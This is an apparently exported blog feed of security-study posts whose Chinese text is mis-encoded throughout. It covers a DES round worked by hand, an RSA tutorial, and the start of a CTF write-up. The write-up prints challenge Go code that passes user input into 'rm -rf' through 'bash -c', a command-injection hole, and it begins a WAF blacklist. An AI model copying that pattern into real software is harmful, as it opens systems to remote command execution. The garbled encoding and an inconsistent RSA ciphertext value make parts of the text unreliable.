S6(<span class="number">100110</span>)=<span class="number">0</span>101, S7(<span class="number">0</span>10100)=<span class="number">1001</span>, S8(<span class="number">100111</span>)=0111</span><br></pre></td></tr></table></figure><h3 id="pç›’ç½®æ¢"><a class="markdownIt-Anchor" href="#pç›’ç½®æ¢">#</a> P ç›’ç½®æ¢</h3><p>åˆ†ç»„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>101  <span class="number">4</span></span><br><span class="line"><span class="number">1100</span>  <span class="number">8</span></span><br><span class="line"><span class="number">1000</span>  <span class="number">12</span></span><br><span class="line"><span class="number">00</span>10  <span class="number">16</span></span><br><span class="line"><span class="number">1011</span>  <span class="number">20</span></span><br><span class="line"><span class="number">0</span>101  <span class="number">24</span></span><br><span class="line"><span class="number">1001</span>  <span class="number">28</span></span><br><span class="line">0111  <span class="number">32</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/8e0a181dd1f94cbf90170f1db29b1b95.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ ¹æ® P ç›’ç½®æ¢è¡¨è½¬æ¢å¾—åˆ°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>10</span><br><span class="line">0011</span><br><span class="line"><span class="number">0</span>100</span><br><span class="line"><span class="number">1010</span></span><br><span class="line"><span class="number">1010</span></span><br><span class="line"><span class="number">1001</span></span><br><span class="line"><span class="number">1011</span></span><br><span class="line"><span class="number">1011</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F= <span class="number">00</span>100011 <span class="number">0</span>1001010 <span class="number">10101001</span> <span class="number">10111011</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L0=<span class="number">11001100</span> <span class="number">00000000</span> <span class="number">11001100</span> <span class="number">11111111</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R1=L0^F=<span class="number">11101111</span> <span class="number">0</span>1001010 01100101 <span class="number">0</span>1000100</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L1=R0=<span class="number">11110000</span> <span class="number">10101010</span> <span class="number">11110000</span> <span class="number">10101010</span></span><br></pre></td></tr></table></figure><p>ç»è¿‡ç¬¬ä¸€è½®åŠ å¯†å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">M1=<span class="number">11101111</span> <span class="number">01001010</span> <span class="number">01100101</span> <span class="number">01000100</span> <span class="number">11110000</span> <span class="number">10101010</span> <span class="number">11110000</span> <span class="number">10101010</span></span><br></pre></td></tr></table></figure><p>å³<br> M1=(EF4A6544F0AAF0AA) 16</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;desåŠ å¯†&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#desåŠ å¯†&quot;&gt;#&lt;/a&gt; DES åŠ å¯†&lt;/h3&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre</summary>
      
    
    
    
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="https://ki10moc.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="å¯†ç å­¦" scheme="https://ki10moc.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    <category term="DES" scheme="https://ki10moc.github.io/tags/DES/"/>
    
  </entry>
  
  <entry>
    <title>ä¿¡å®‰å®éªŒ-RSA(å¤‡è¯¾)</title>
    <link href="https://ki10moc.github.io/2022/09/25/%E4%BF%A1%E5%AE%89%E5%AE%9E%E9%AA%8C-RSA(%E5%A4%87%E8%AF%BE)/"/>
    <id>https://ki10moc.github.io/2022/09/25/%E4%BF%A1%E5%AE%89%E5%AE%9E%E9%AA%8C-RSA(%E5%A4%87%E8%AF%BE)/</id>
    <published>2022-09-25T15:07:08.000Z</published>
    <updated>2022-09-26T06:29:49.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ç®€ä»‹"><a class="markdownIt-Anchor" href="#ç®€ä»‹">#</a> ç®€ä»‹</h2><ul><li><p>æ¥æº</p><p>RSA åŠ å¯†ç®—æ³•æ˜¯ä¸€ç§éå¯¹ç§°åŠ å¯†ç®—æ³•ã€‚åœ¨å…¬å¼€å¯†é’¥åŠ å¯†å’Œç”µå­å•†ä¸šä¸­ RSA è¢«å¹¿æ³›ä½¿ç”¨ã€‚RSA æ˜¯ 1977 å¹´ç”±ç½—çº³å¾·ãƒ»æç»´æ–¯ç‰¹ï¼ˆRon Rivestï¼‰ã€é˜¿è¿ªãƒ»è¨è«å°”ï¼ˆAdi Shamirï¼‰å’Œä¼¦çº³å¾·ãƒ»é˜¿å¾·æ›¼ï¼ˆLeonard Adlemanï¼‰ä¸€èµ·æå‡ºçš„ã€‚RSA å°±æ˜¯ä»–ä»¬ä¸‰äººå§“æ°å¼€å¤´å­—æ¯æ‹¼åœ¨ä¸€èµ·ç»„æˆçš„ã€‚</p></li><li><p>å®‰å…¨æ€§</p><p>RSA ç®—æ³•çš„å¯é æ€§ç”±æå¤§æ•´æ•°å› æ•°åˆ†è§£çš„éš¾åº¦å†³å®šã€‚æ¢è¨€ä¹‹ï¼Œå¯¹ä¸€æå¤§æ•´æ•°åšå› æ•°åˆ†è§£æ„ˆå›°éš¾ï¼ŒRSA ç®—æ³•æ„ˆå¯é ã€‚å‡å¦‚æœ‰äººæ‰¾åˆ°ä¸€ç§å¿«é€Ÿå› æ•°åˆ†è§£çš„ç®—æ³•çš„è¯ï¼Œé‚£ä¹ˆç”¨ RSA åŠ å¯†çš„ä¿¡æ¯çš„å¯é æ€§å°±è‚¯å®šä¼šæåº¦ä¸‹é™ã€‚ä½†æ‰¾åˆ°è¿™æ ·çš„ç®—æ³•çš„å¯èƒ½æ€§æ˜¯éå¸¸å°çš„ã€‚å¦‚ä»Šï¼Œåªæœ‰çŸ­çš„ RSA å¯†é’¥æ‰å¯èƒ½è¢«å¼ºåŠ›æ–¹å¼è§£ç ´ã€‚åˆ° 2017 å¹´ä¸ºæ­¢ï¼Œè¿˜æ²¡æœ‰ä»»ä½•å¯é çš„æ”»å‡» RSA ç®—æ³•çš„æ–¹å¼ã€‚</p></li></ul><h2 id="å‰ç½®çŸ¥è¯†"><a class="markdownIt-Anchor" href="#å‰ç½®çŸ¥è¯†">#</a> å‰ç½®çŸ¥è¯†</h2><h3 id="æ¨¡è¿ç®—"><a class="markdownIt-Anchor" href="#æ¨¡è¿ç®—">#</a> æ¨¡è¿ç®—</h3><p>å‡è®¾ a,r,mâˆˆZï¼ˆZ ä¸ºæ•´æ•°é›†ï¼‰ï¼Œå¹¶ä¸” m&gt;0ã€‚å¦‚æœ m é™¤ a-rï¼Œå¯è®°ä½œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a â‰¡ r mod m</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ m ä¸ºæ¨¡æ•°ï¼Œr ä¸ºä½™æ•°</p><h3 id="ä½™æ•°è®¡ç®—"><a class="markdownIt-Anchor" href="#ä½™æ•°è®¡ç®—">#</a> ä½™æ•°è®¡ç®—</h3><p>æ€»å¯ä»¥æ‰¾åˆ°ä¸€ä¸ª aâˆˆZï¼Œä½¿å¾—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = q Â· m + r , å…¶ä¸­<span class="number">0</span> â‰¤ r &lt; m</span><br></pre></td></tr></table></figure><p>ç”±äº a - r = qãƒ»mï¼ˆm é™¤ a-rï¼‰ï¼Œä¸Šé¢çš„è¡¨è¾¾å¼å¯ä»¥å†™ä½œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a â‰¡ r mod <span class="title function_ invoke__">m</span>(râˆˆ&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,â€¦,m-<span class="number">1</span>&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å¦‚a=<span class="number">88</span>,m=<span class="number">12</span>,åˆ™</span><br><span class="line"></span><br><span class="line"><span class="number">88</span> = <span class="number">12</span> Â·<span class="number">7</span> + <span class="number">4</span></span><br><span class="line">å› æ­¤<span class="number">88</span> â‰¡ <span class="number">4</span> mod <span class="number">12</span></span><br></pre></td></tr></table></figure><h3 id="ç­‰ä»·ç±»ä¸­æ‰€æœ‰æˆå‘˜å¾—åˆ°è¡Œä¸ºç­‰ä»·"><a class="markdownIt-Anchor" href="#ç­‰ä»·ç±»ä¸­æ‰€æœ‰æˆå‘˜å¾—åˆ°è¡Œä¸ºç­‰ä»·">#</a> ç­‰ä»·ç±»ä¸­æ‰€æœ‰æˆå‘˜å¾—åˆ°è¡Œä¸ºç­‰ä»·</h3><p>å¯¹äºä¸€ä¸ªç»™å®šæ¨¡æ•° mï¼Œé€‰æ‹©ç­‰ä»·ç±»ä¸­ä»»ä½•ä¸€ä¸ªå…ƒç´ æ¥è®¡ç®—ï¼Œç»“æœéƒ½æ˜¯ä¸€æ ·çš„</p><p>ç›´æ¥è®¡ç®—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>â¸ = <span class="number">6561</span> â‰¡ <span class="number">2</span> mod <span class="number">7</span></span><br></pre></td></tr></table></figure><p>æ›¿ä»£è®¡ç®— (ç®€åŒ–)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å°†<span class="number">3</span>â¸ æ›¿æ¢ä¸º<span class="number">3</span>â´ Â·<span class="number">3</span>â´ = <span class="number">81</span> Â·<span class="number">81</span></span><br><span class="line">å› ä¸º<span class="number">81</span> = <span class="number">11</span> Â· <span class="number">7</span> +<span class="number">4</span></span><br><span class="line">åˆ™<span class="number">3</span>â¸ = <span class="number">81</span> Â· <span class="number">81</span> â‰¡ <span class="number">4</span> Â· <span class="number">4</span> =<span class="number">16</span> mod <span class="number">7</span></span><br><span class="line">æœ€åå¾—åˆ°<span class="number">16</span> â‰¡ <span class="number">2</span> mod <span class="number">7</span></span><br></pre></td></tr></table></figure><h3 id="ä¹˜æ³•é€†å…ƒæ¨¡é€†å…ƒ"><a class="markdownIt-Anchor" href="#ä¹˜æ³•é€†å…ƒæ¨¡é€†å…ƒ">#</a> ä¹˜æ³•é€†å…ƒ (æ¨¡é€†å…ƒ)</h3><p>æ¨¡é€†å…ƒä¹Ÿç§°ä¸ºæ¨¡å€’æ•°ã€‚</p><p>ä¸€æ•´æ•° ğ‘ å¯¹åŒä½™ ğ‘› ä¹‹æ¨¡é€†å…ƒæ˜¯æŒ‡æ»¡è¶³ä»¥ä¸‹å…¬å¼çš„æ•´æ•° ğ‘ï¼š</p><p><img src="https://img-blog.csdnimg.cn/12c59c3f2e6e421ab7f18a30d9f77fb2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¹Ÿå¯ä»¥å†™æˆä»¥ä¸‹çš„å¼å­ï¼š</p><p><img src="https://img-blog.csdnimg.cn/d7d8c79d32af4686a643fcf6615742a9.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ•´æ•° ğ‘ å¯¹æ¨¡æ•° ğ‘› ä¹‹æ¨¡é€†å…ƒå­˜åœ¨çš„å……åˆ†å¿…è¦æ¡ä»¶æ˜¯ ğ‘ å’Œ ğ‘› äº’ç´ ï¼Œè‹¥æ­¤æ¨¡é€†å…ƒå­˜åœ¨ï¼Œåœ¨æ¨¡æ•° ğ‘› ä¸‹çš„é™¤æ³•å¯ä»¥ç”¨å’Œå¯¹åº”æ¨¡é€†å…ƒçš„ä¹˜æ³•æ¥è¾¾æˆï¼Œæ­¤æ¦‚å¿µå’Œå®æ•°é™¤æ³•çš„æ¦‚å¿µç›¸åŒã€‚</p><p><img src="https://img-blog.csdnimg.cn/9a93305db52546e7b3d4a25be7976ba9.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="pythonå®ç°æ¨¡é€†å…ƒ"><a class="markdownIt-Anchor" href="#pythonå®ç°æ¨¡é€†å…ƒ">#</a> Python å®ç°æ¨¡é€†å…ƒ</h3><p>å¯ä»¥ä½¿ç”¨ Python ç¬¬ä¸‰æ–¹åŒ… Crypto çš„ inverse () å‡½æ•°æ±‚æ¨¡é€†å…ƒã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number import inverse</span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">inverse</span>(<span class="number">3</span>, <span class="number">7</span>))  <span class="comment"># 3 æ˜¯è¦æ±‚é€†å…ƒçš„æ•°ï¼Œ7æ˜¯æ¨¡æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#5</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨ Python ç¬¬ä¸‰æ–¹åŒ… gmpy2 çš„ invert () å‡½æ•°æ±‚æ¨¡é€†å…ƒã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 import invert</span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">invert</span>(<span class="number">3</span>, <span class="number">7</span>)) <span class="comment"># 3 æ˜¯è¦æ±‚é€†å…ƒçš„æ•°ï¼Œ7æ˜¯æ¨¡æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#5</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥åœ¨ SageMath ä¸­ç›´æ¥ç”¨ inverse_mod () å‡½æ•°æ±‚æ¨¡é€†å…ƒã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">inverse_mod</span>(<span class="number">3</span>, <span class="number">7</span>) <span class="comment"># 3 æ˜¯è¦æ±‚é€†å…ƒçš„æ•°ï¼Œ7æ˜¯æ¨¡æ•°</span></span><br></pre></td></tr></table></figure><h3 id="æ¨¡è¿ç®—-2"><a class="markdownIt-Anchor" href="#æ¨¡è¿ç®—-2">#</a> æ¨¡è¿ç®—</h3><p>åŠ æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span> + <span class="number">4</span> â‰¡ <span class="number">0</span> (ğ‘šğ‘œğ‘‘ <span class="number">7</span>)</span><br><span class="line"><span class="number">5</span> + <span class="number">5</span> â‰¡ <span class="number">3</span> (ğ‘šğ‘œğ‘‘ <span class="number">7</span>)</span><br><span class="line"><span class="number">1</span> + <span class="number">5</span> â‰¡ <span class="number">6</span> (ğ‘šğ‘œğ‘‘ <span class="number">7</span>)</span><br></pre></td></tr></table></figure><p>å‡æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span> âˆ’ <span class="number">2</span> â‰¡ <span class="number">3</span> (ğ‘šğ‘œğ‘‘ <span class="number">7</span>)</span><br><span class="line"><span class="number">3</span> âˆ’ <span class="number">5</span> â‰¡ <span class="number">3</span> âˆ’ <span class="number">5</span> + <span class="number">7</span> â‰¡ <span class="number">3</span> + <span class="number">2</span> (ğ‘šğ‘œğ‘‘ <span class="number">7</span>)</span><br></pre></td></tr></table></figure><p>ä¹˜æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span> Ã— <span class="number">4</span> â‰¡ <span class="number">5</span> (ğ‘šğ‘œğ‘‘ <span class="number">7</span>)</span><br><span class="line"><span class="number">2</span> Ã— <span class="number">2</span> â‰¡ <span class="number">4</span> (ğ‘šğ‘œğ‘‘ <span class="number">7</span>)</span><br></pre></td></tr></table></figure><p>æ¨¡è¿ç®—æ²¡æœ‰é™¤æ³• (æ­¤å¤„ç»“åˆä¹˜æ³•é€†å…ƒ)</p><p><img src="https://img-blog.csdnimg.cn/a0d893b0a52e4f7283bcc9d69a88ed24.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/93e08ed2edd046d5b9f6efc84efc7475.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="æ¬§æ‹‰å‡½æ•°"><a class="markdownIt-Anchor" href="#æ¬§æ‹‰å‡½æ•°">#</a> æ¬§æ‹‰å‡½æ•°</h3><p>Zm å†…ä¸ m äº’ç´ çš„æ•´æ•°çš„ä¸ªæ•°å¯ä»¥è¡¨ç¤ºä¸º Ï†(n)</p><p>ç¤ºä¾‹ï¼š</p><p 0,="" 1,="" 2,="" 3,="" 4,="" 5="">å‡è®¾ m ç­‰äº 6 æ—¶ï¼Œç°åœ¨å¯¹åº”çš„é›†åˆä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">GCD</span>(<span class="number">0</span>, <span class="number">6</span>) = <span class="number">6</span></span><br><span class="line"><span class="title function_ invoke__">GCD</span>(<span class="number">1</span>, <span class="number">6</span>) = <span class="number">1</span>------äº’ç´ </span><br><span class="line"><span class="title function_ invoke__">GCD</span>(<span class="number">2</span>, <span class="number">6</span>) = <span class="number">2</span></span><br><span class="line"><span class="title function_ invoke__">GCD</span>(<span class="number">3</span>, <span class="number">6</span>) = <span class="number">3</span></span><br><span class="line"><span class="title function_ invoke__">GCD</span>(<span class="number">4</span>, <span class="number">6</span>) = <span class="number">2</span></span><br><span class="line"><span class="title function_ invoke__">GCD</span>(<span class="number">5</span>, <span class="number">6</span>) = <span class="number">1</span>------äº’ç´ </span><br></pre></td></tr></table></figure><p>ç”±äºè¯¥é›†åˆä¸­ï¼Œæœ‰ä¸¤ä¸ªä¸ 6 äº’ç´ çš„æ•°å­—ï¼Œå³ 1 å’Œ 5</p><p>æ‰€ä»¥æ¬§æ‹‰å‡½æ•°çš„å€¼ä¸º 2ï¼Œå³ Ï†(6) = 2ã€‚</p><p>Ï†(n)=(p-1)(q-1)     //pq ä¸ºä¸ç›¸ç­‰çš„è´¨æ•°</p><h2 id="ç§˜é’¥ç”Ÿæˆ"><a class="markdownIt-Anchor" href="#ç§˜é’¥ç”Ÿæˆ">#</a> ç§˜é’¥ç”Ÿæˆ</h2><p>1ã€é€‰æ‹©ä¸¤ä¸ªä¸ç›¸ç­‰çš„è´¨æ•° p å’Œ q</p><p>2ã€è®¡ç®— q ä¸ p çš„ä¹˜ç§¯ n</p><p>3ã€è®¡ç®— n çš„æ¬§æ‹‰å‡½æ•° Ï†(n)</p><p>4ã€é€‰æ‹©ä¸€ä¸ªæ•´æ•° eï¼Œ(1&lt;e&lt;Ï†(n))ï¼Œä¸” e ä¸ Ï†(n) äº’è´¨</p><p>5ã€è®¡ç®— e å¯¹äº Ï†(n) çš„æ¨¡åå…ƒç´  dï¼Œå…¬å¼è¡¨ç¤ºä¸º <code>edâ‰¡1(modÏ†(n))</code></p><p>6ã€(n,e) æ‰“åŒ…ä¸ºå…¬é’¥ï¼Œ(n,d) æ‰“åŒ…ä¸ºç§˜é’¥</p><h2 id="åŠ è§£å¯†å‡½æ•°"><a class="markdownIt-Anchor" href="#åŠ è§£å¯†å‡½æ•°">#</a> åŠ è§£å¯†å‡½æ•°</h2><p><img src="https://img-blog.csdnimg.cn/44d5e9a4a31a411da09bc758be3623a3.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="åŠ å¯†è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#åŠ å¯†è¿‡ç¨‹">#</a> åŠ å¯†è¿‡ç¨‹</h2><p>1ã€é¦–å…ˆå–ä¸€ä¸ªæ˜æ–‡ mï¼Œå‡è®¾ä¸º 4</p><p>2ã€é€‰æ‹©ä¸ç›¸ç­‰çš„è´¨æ•°ã€‚å‡è®¾ q=3ï¼Œp=11</p><p>3ã€è®¡ç®— n=pq=33</p><p>4ã€è®¡ç®— Ï†(n)=(p-1)(q-1)=(3-1)(11-1)=20</p><p>5ã€é€‰æ‹©ä¸€ä¸ªæ•´æ•° eï¼Œå‡è®¾ e=3</p><p>6ã€è®¡ç®— d â‰¡ eâ»Â¹ â‰¡ 7 mod 20, å³ d = 7</p><p><img src="https://img-blog.csdnimg.cn/fb3eb258a52448bca6c167bdcd31746c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>7ã€è®¡ç®— máµ‰ â‰¡ c mod nï¼Œå³ 64 â‰¡ 31 mod 33ï¼Œå¾—åˆ° c = 33</p><p>æ­¤æ—¶å¾—åˆ°å¯†æ–‡ c = 31ï¼Œå…¬é’¥å¯¹ (33,3)ï¼Œç§é’¥å¯¹ (33,7)</p><h2 id="è§£å¯†è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#è§£å¯†è¿‡ç¨‹">#</a> è§£å¯†è¿‡ç¨‹</h2><p>1ã€å‡è®¾åªçŸ¥é“ n=33ï¼Œc=31ï¼Œe=3</p><p>2ã€é¦–å…ˆåˆ†è§£ nï¼Œn=11ãƒ»3</p><p>3ã€è®¡ç®—æ¬§æ‹‰å‡½æ•° Ï†(n)=(11-1)ãƒ»(3-1)=20</p><p>4ã€è®¡ç®—æ¨¡åå…ƒç´  dï¼Œæ ¹æ® <code>edâ‰¡1(modÏ†(n))</code>  ï¼Œd=(20+1)/3=7</p><p>5ã€è§£å¯† <code>cáµˆ â‰¡ m mod n</code>  ï¼Œå³ 31â· â‰¡ m mod 33ï¼Œè®¡ç®—å¾—åˆ° m = 4</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ç®€ä»‹&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#ç®€ä»‹&quot;&gt;#&lt;/a&gt; ç®€ä»‹&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;æ¥æº&lt;/p&gt;
&lt;p&gt;RSA åŠ å¯†ç®—æ³•æ˜¯ä¸€ç§éå¯¹ç§°åŠ å¯†ç®—æ³•ã€‚åœ¨å…¬å¼€å¯†é’¥åŠ å¯†å’Œç”µå­å•†ä¸šä¸­ RSA è¢«å¹¿æ³›ä½¿ç”¨ã€‚RSA æ˜¯ 19</summary>
      
    
    
    
    
    <category term="å¯†ç å­¦" scheme="https://ki10moc.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    <category term="RSA" scheme="https://ki10moc.github.io/tags/RSA/"/>
    
    <category term="æ•°è®º" scheme="https://ki10moc.github.io/tags/%E6%95%B0%E8%AE%BA/"/>
    
  </entry>
  
  <entry>
    <title>æ¹–æ¹˜æ¯ 2021 final MultistaeAgency</title>
    <link href="https://ki10moc.github.io/2022/09/21/[%E6%B9%96%E6%B9%98%E6%9D%AF%202021%20final]MultistaeAgency/"/>
    <id>https://ki10moc.github.io/2022/09/21/[%E6%B9%96%E6%B9%98%E6%9D%AF%202021%20final]MultistaeAgency/</id>
    <published>2022-09-21T15:51:08.000Z</published>
    <updated>2022-09-21T16:29:22.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="é™„ä»¶"><a class="markdownIt-Anchor" href="#é™„ä»¶">#</a> é™„ä»¶</h3><p><img src="https://img-blog.csdnimg.cn/d6b8b5877a73434ebaa441197c5894ca.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>web ä¸‹çš„ main.go<br><img src="https://img-blog.csdnimg.cn/ee85e82d83d64d0abdd59a50436f8e6f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å­˜åœ¨ä¸‰ä¸ªè·¯å¾„<br> list å±•ç¤ºä¸Šä¼ åˆ° token ä¸‹çš„æ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/d6554ea5d1704a5284eb3ecf6d152cf7.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>upload ä¸Šä¼ æ–‡ä»¶å¹¶è¯·æ±‚å†…ç½‘ 9091 çš„ manage æ¥å£<br><img src="https://img-blog.csdnimg.cn/479cabe06a3340baaecc1a4c01bfebf1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>tokenï¼šè·å– token å¹¶æ·»åŠ ç¯å¢ƒå˜é‡<br><img src="https://img-blog.csdnimg.cn/3a189c683b6b4ceba2dcb56fd75c6004.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br> manage æ¥å£</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">manage</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">values := r.URL.Query()</span><br><span class="line">m := values.Get(<span class="string">&quot;m&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> !waf(m) &#123;</span><br><span class="line">fmt.Fprintf(w, <span class="string">&quot;waf!&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">cmd := fmt.Sprintf(<span class="string">&quot;rm -rf uploads/%s&quot;</span>, m)</span><br><span class="line">fmt.Println(cmd)</span><br><span class="line">command := exec.Command(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd)</span><br><span class="line">outinfo := bytes.Buffer&#123;&#125;</span><br><span class="line">outerr := bytes.Buffer&#123;&#125;</span><br><span class="line">command.Stdout = &amp;outinfo</span><br><span class="line">command.Stderr = &amp;outerr</span><br><span class="line">err := command.Start()</span><br><span class="line">res := <span class="string">&quot;ERROR&quot;</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err.Error())</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err = command.Wait(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">res = outerr.String()</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">res = outinfo.String()</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">fmt.Fprintf(w, res)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œå­˜åœ¨ rce çš„ç‚¹</p><p>å…¶ä¸­æœ‰ä¸€ä¸ª waf</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">waf</span><span class="params">(c <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line"><span class="keyword">var</span> t <span class="type">int32</span></span><br><span class="line">t = <span class="number">0</span></span><br><span class="line">blacklist := []<span class="type">string</span>&#123;<span class="string">&quot;.&quot;</span>, <span class="string">&quot;*&quot;</span>, 